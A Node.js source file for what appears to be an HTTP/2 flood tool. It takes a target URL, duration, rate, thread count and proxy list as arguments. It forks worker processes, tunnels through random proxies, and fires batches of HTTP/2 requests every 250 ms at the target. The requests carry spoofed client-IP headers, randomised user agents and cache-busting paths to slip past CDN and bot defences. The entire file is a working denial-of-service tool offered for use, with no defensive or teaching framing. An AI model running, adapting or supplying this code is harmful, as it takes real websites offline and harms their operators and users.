const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require("user-agents");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});

if (process.argv.length < 7) {
    console.log("Usage: target time rate threads proxyFile");
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomInt(0, elements.length)];
}

function randomString(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomIp() {
    return `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const signatureAlgorithms = [
    "ecdsa_secp256r1_sha256",
    "rsa_pkcs1_sha384",
    "rsa_pkcs1_sha512",
    "hmac_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pkcs1_sha1",
    "hmac_sha1"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "*/*",
    "image/*",
    "image/webp,image/apng",
    "text/html",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "application/json",
    "application/xml",
    "application/pdf",
    "text/css",
    "application/javascript"
];

const languageHeaders = [
    "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "ko-KR",
    "en-US",
    "zh-CN",
    "zh-TW",
    "en-ZA",
    "fr-FR",
    "ja-JP",
    "ar-EG",
    "de-DE",
    "es-ES"
];

const encodingHeaders = [
    "gzip, deflate, br",
    "deflate",
    "gzip, deflate, lzma, sdch",
    "identity",
    "compress",
    "br"
];

const methods = [
    "GET",
    "HEAD",
    "POST",
    "DELETE",
    "PATCH"
];

const cacheControlHeaders = [
    "max-age=0",
    "no-cache",
    "no-store",
    "must-revalidate"
];

const secChUaHeaders = [
    '"Chromium";v="137", "Not/A)Brand";v="24"',
    '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"'
];

const secChUaPlatformHeaders = [
    "Linux",
    "Windows",
    "macOS",
    "Android",
    "iOS"
];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log(`\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m${parsedTarget.host}\x1b[0m`);
    console.log(`\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m${args.time}\x1b[0m`);
    console.log(`\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m${args.threads}\x1b[0m`);
    console.log(`\x1b[1m\x1b[31mRequests per second: \x1b[0m\x1b[1m${args.rate}\x1b[0m`);
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    httpRequest(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: ${error}`);
        });
    }
}

function generateUserAgent() {
    const userAgent = new UserAgent({
        deviceCategory: randomElement(["desktop", "mobile", "tablet"]),
        platform: randomElement(["Win32", "MacIntel", "Linux x86_64", "iPhone", "Android"])
    });
    return userAgent.toString();
}

const socket = new NetSocket();

headers[":method"] = randomElement(methods);
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randomString(10) + "=" + randomString(5);
headers[":scheme"] = "https";
headers["user-agent"] = generateUserAgent();
headers["accept"] = randomElement(acceptHeaders);
headers["accept-encoding"] = randomElement(encodingHeaders);
headers["accept-language"] = randomElement(languageHeaders);
headers["cache-control"] = randomElement(cacheControlHeaders);
headers["sec-ch-ua"] = randomElement(secChUaHeaders);
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = randomElement(secChUaPlatformHeaders);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["sec-fetch-user"] = "?1";
headers["upgrade-insecure-requests"] = "1";
headers["x-requested-with"] = "XMLHttpRequest";
headers["x-forwarded-for"] = randomIp();
headers["x-real-ip"] = randomIp();
headers["x-client-ip"] = randomIp();
headers["cf-connecting-ip"] = randomIp();
headers["x-forwarded-host"] = parsedTarget.host;
headers["x-forwarded-proto"] = randomElement(["https", "http"]);
headers["x-frame-options"] = randomElement(["DENY", "SAMEORIGIN"]);
headers["referer"] = `https://${randomString(5)}.com/${randomString(8)}`;
headers["origin"] = `https://${randomString(5)}.com`;
headers["via"] = randomString(12);
headers["akamai-origin-hop"] = randomString(12);
headers["cluster-ip"] = randomString(12);
headers["x-request-id"] = randomString(16);
headers["x-correlation-id"] = randomString(16);
headers["x-device-id"] = randomString(20);
headers["x-session-token"] = randomString(32);
headers["pragma"] = randomElement(["no-cache", "max-age=0"]);
headers["dnt"] = randomElement(["0", "1"]);
headers["x-cache-status"] = randomElement(["hit", "miss", "bypass"]);
headers["x-browser-id"] = randomString(16);
headers["x-app-version"] = `${randomInt(1, 5)}.${randomInt(0, 9)}.${randomInt(0, 9)}`;
headers["x-custom-header"] = randomString(10);
headers["x-trace-id"] = randomString(24);
headers["x-geo-location"] = randomElement(["US", "EU", "ASIA", "AU"]);
headers["x-user-session"] = randomString(20);
headers["x-api-key"] = randomString(32);
headers["x-request-timestamp"] = Date.now().toString();
headers["x-csrf-token"] = randomString(16);
headers["x-forwarded-port"] = randomElement(["80", "443", "8080"]);
headers["x-originating-ip"] = randomIp();
headers["x-remote-ip"] = randomIp();
headers["x-cloud-trace-context"] = `${randomString(16)}/${randomInt(1000, 9999)}`;
headers["x-amzn-trace-id"] = `Root=1-${randomString(8)}-${randomString(24)}`;
headers["x-forwarded-server"] = randomString(10);
headers["x-http-method-override"] = randomElement(methods);
headers["x-ua-compatible"] = "IE=edge";
headers["x-dns-prefetch-control"] = randomElement(["on", "off"]);
headers["x-download-options"] = "noopen";
headers["x-content-type-options"] = "nosniff";
headers["x-xss-protection"] = randomElement(["0", "1; mode=block"]);
headers["x-powered-by"] = randomString(10);
headers["x-server-id"] = randomString(12);
headers["x-client-session"] = randomString(20);
headers["x-request-origin"] = `https://${randomString(5)}.com`;
headers["x-session-id"] = randomString(24);
headers["x-transaction-id"] = randomString(20);
headers["x-client-version"] = `${randomInt(1, 5)}.${randomInt(0, 9)}`;
headers["x-environment"] = randomElement(["production", "staging", "development"]);
headers["x-region"] = randomElement(["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]);

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    socket.httpRequest(proxyOptions, (connection, error) => {
        if (error) {
            connection?.close();
            connection?.destroy();
            return;
        }

        const tlsOptions = (() => {
            const useTlsOption2 = Math.random() < 0.5;
            return useTlsOption2 ?
                {
                    secure: true,
                    ALPNProtocols: ["h2"],
                    sigals: randomElement(signatureAlgorithms),
                    socket: connection,
                    ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
                    ecdhCurve: "P-256:P-384",
                    host: parsedTarget.host,
                    servername: parsedTarget.host,
                    rejectUnauthorized: false
                } :
                {
                    secure: true,
                    ALPNProtocols: ["h2"],
                    ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
                    ecdhCurve: "auto",
                    rejectUnauthorized: false,
                    servername: parsedTarget.host,
                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                        crypto.constants.SSL_OP_NO_TICKET |
                        crypto.constants.SSL_OP_NO_COMPRESSION |
                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
                        crypto.constants.SSL_OP_SINGLE_DH_USE |
                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                        crypto.constants.SSL_OP_NO_QUERY_MTU
                };
        })();

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 50000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const intervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 250);
        });

        client.on("close", () => {
            client.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
